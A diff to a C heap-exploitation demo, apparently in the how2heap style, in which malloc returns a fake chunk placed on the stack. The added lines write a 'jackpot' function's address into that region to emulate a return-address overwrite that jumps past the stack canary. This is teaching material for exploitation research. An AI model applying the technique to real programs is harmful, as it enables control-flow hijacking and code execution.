@@ -1,6 +1,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <string.h>
+
+void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
 
 int main() {
   intptr_t stack_buffer[4] = {0};
@@ -27,5 +30,9 @@ int main() {
   //------------------------------------
 
   fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
-  fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));
+  char *p2 = malloc(0x100);
+  fprintf(stderr, "malloc(0x100): %p\n", p2);
+
+  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+  memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 }
